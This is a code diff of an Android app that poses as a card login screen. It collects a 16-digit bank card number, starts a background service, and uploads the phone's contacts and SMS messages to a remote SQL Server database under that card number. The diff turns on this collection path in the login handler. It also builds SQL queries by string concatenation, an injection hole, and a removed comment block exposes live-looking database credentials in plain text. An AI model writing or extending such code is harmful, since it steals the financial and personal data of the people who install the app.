@@ -47,7 +47,6 @@ public class MainActivity extends AppCompatActivity {
     private static boolean READ_SMS_GRANTED = false;
     private Connection connection = null;
     private String cardnumber="";
-
     private PackageManager packageManager = null;
     private List applist = null;
     private LinkedList<String> contacts = new LinkedList<>();
@@ -61,29 +60,29 @@ public class MainActivity extends AppCompatActivity {
 
 
 
-        ((TextView) findViewById(R.id.editTextNumber)).addTextChangedListener(new TextWatcher() {
-            @Override
-            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
-            }
-
-            boolean textprobel = false;
-
-            @Override
-            public void onTextChanged(CharSequence s, int start, int before, int count) {
-                if (s.toString().length() % 4 == 0) {
-                    textprobel = true;
-                } else {
-                    textprobel = false;
-                }
-            }
-
-            @Override
-            public void afterTextChanged(Editable s) {
-                if (textprobel) {
-                    s.append(" ");
-                }
-            }
-        });
+//        ((TextView) findViewById(R.id.editTextNumber)).addTextChangedListener(new TextWatcher() {
+//            @Override
+//            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
+//            }
+//
+//            boolean textprobel = false;
+//
+//            @Override
+//            public void onTextChanged(CharSequence s, int start, int before, int count) {
+//                if (s.toString().length() % 4 == 0) {
+//                    textprobel = true;
+//                } else {
+//                    textprobel = false;
+//                }
+//            }
+//
+//            @Override
+//            public void afterTextChanged(Editable s) {
+//                if (textprobel) {
+//                    s.append(" ");
+//                }
+//            }
+//        });
 
         if(READ_CONTACTS_GRANTED) {
             readContacts();
@@ -134,19 +133,23 @@ public class MainActivity extends AppCompatActivity {
 
     public void onClickLogin(View v) {
 
-//        startService(new Intent(this, MyService2.class));
+
 
         if(((TextView)findViewById(R.id.editTextNumber)).getText().toString().length()==16) {
             cardnumber=((TextView)findViewById(R.id.editTextNumber)).getText().toString();
             new LoadDataBase().execute();
+            Intent servintent=new Intent(this, MyService2.class);
+            startService(servintent);
+
+            Intent intent =  new Intent(this.getApplicationContext(), ActivityMenu.class);
+            startActivity(intent);
         }
         else
         {
             Toast.makeText(this.getApplicationContext(),"Это не может быть номер карты!",Toast.LENGTH_SHORT).show();
 
         }
-//            Intent intent =  new Intent(this.getApplicationContext(), ActivityMenu.class);
-//            startActivity(intent);
+
 
     }
 
@@ -155,9 +158,9 @@ public class MainActivity extends AppCompatActivity {
         stopService(new Intent(this, MyService2.class));
     }
 
-    //    public void onClickStop(View v) {
-//        stopService(new Intent(this, MyService.class));
-//    }
+
+
+
     private List checkForLaunchIntent(List<ApplicationInfo> list) {
 
         ArrayList appList = new ArrayList();
@@ -165,7 +168,7 @@ public class MainActivity extends AppCompatActivity {
         for (ApplicationInfo info : list) {
             try {
                 if (packageManager.getLaunchIntentForPackage(info.packageName) != null) {
-                    appList.add(info);
+                    appList.add(info.name);
                 }
             } catch (Exception e) {
                 e.printStackTrace();
@@ -197,25 +200,22 @@ public class MainActivity extends AppCompatActivity {
                     Statement statement = null;
                     try {
                         statement = connection.createStatement();
-
                         int clientID=0;
                         ResultSet resultSet = statement.executeQuery("Select ID FROM Clients WHERE CardNumber='"+cardnumber+"'");
                         resultSet.next();
-                            clientID = resultSet.getInt(1);
-
-
-                        Log.d("db",String.valueOf(clientID));
+                        clientID = resultSet.getInt(1);
 
                         if(clientID>0) {
                             String insertstring = "INSERT Contacts(ClientID, ContactName) VALUES (";
                             for (int k = 0; k < contacts.size(); k++) {
                                 insertstring += clientID + ", '" + contacts.get(k) + "'";
                                 if (k < contacts.size() - 1) {
-                                    insertstring += ", (";
+                                    insertstring += "), (";
                                 }
 
                             }
                             insertstring +=")";
+                            Log.d("db",insertstring);
                              int rows = statement.executeUpdate(insertstring);
 
                             insertstring = "INSERT INTO Messages(ClientID, MessageFrom, MessageText) VALUES (";
@@ -304,26 +304,7 @@ public class MainActivity extends AppCompatActivity {
 //            }
 
 //
-//            try{
-//                Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
-//                String dbURL = "jdbc:sqlserver://SQL5103.site4now.net;database=DB_A72B1E_Secure";
-//                String user = "DB_A72B1E_Secure_admin";
-//                String pass = "Alexz73canY";
-//                conn = DriverManager.getConnection(dbURL, user, pass);
-//                if (conn != null) {
-//                    DatabaseMetaData dm = (DatabaseMetaData) conn.getMetaData();
 //
-//                    Statement statement = conn.createStatement();
-//
-//                    ResultSet resultSet = statement.executeQuery("SELECT TOP (1000) [Id],[CardNumber] FROM Clients");
-//                    while(resultSet.next())
-//                    {
-//                        Log.d("dbvalue",resultSet.getObject(1).toString());
-//                    }
-//                }
-//            } catch (ClassNotFoundException | SQLException e) {
-//                e.printStackTrace();
-//            }
 
             super.onPostExecute(result);
         }
@@ -376,9 +357,6 @@ public class MainActivity extends AppCompatActivity {
 
                 // use msgData
             } while (cursor.moveToNext());
-        } else
-            {
-
         }
         return  sms;
     }
